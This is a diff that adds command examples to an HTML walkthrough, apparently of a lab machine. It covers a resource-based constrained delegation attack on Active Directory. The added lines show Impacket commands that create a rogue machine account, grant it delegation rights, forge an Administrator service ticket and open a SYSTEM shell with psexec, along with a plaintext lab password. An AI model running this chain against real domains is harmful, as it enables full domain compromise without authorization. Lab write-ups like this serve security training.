@@ -495,6 +495,16 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Successfully added machine account ATTACK$ with password AttackerPC1!.
 </code></pre>
+<p>Another Example of this:</p>
+<pre><code>addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 
+$DomainController -domain-netbios $DOMAIN 'domain/user:password'
+
+python3 addcomputer.py -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
+[*] Successfully added machine account evilcom$ with password password.
+</code></pre>
 <p>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</p>
 <pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack
 
@@ -527,6 +537,10 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Delegation rights modified succesfully!
 [*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
 </code></pre>
+<p>Another example of this:</p>
+<pre><code>./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful
+
+</code></pre>
 <p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
 <pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
 
@@ -545,9 +559,26 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
 </code></pre>
+<p>Another example of this:</p>
+<pre><code>python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password
+
+</code></pre>
+<p>Time Error</p>
+<pre><code>If you get this:
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+Do this:
+
+rdate -n $ip
+
+</code></pre>
 <p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
 <pre><code>┌──(kali㉿kali)-[~]
 └─$ export KRB5CCNAME=./Administrator.ccache
+
+or this:
+
+export KRB5CCNAME=`pwd`/Administrator.ccache
 </code></pre>
 <p>Now, all we have to do is add a new entry in <strong>/etc/hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
 <pre><code>┌──(kali㉿kali)-[~]
@@ -571,6 +602,9 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 
 C:\Windows\system32&gt; 
+</code></pre>
+<p>Another example of this:</p>
+<pre><code>python3 psexec.py -k DC.support.htb
 </code></pre>
 
                     </main>
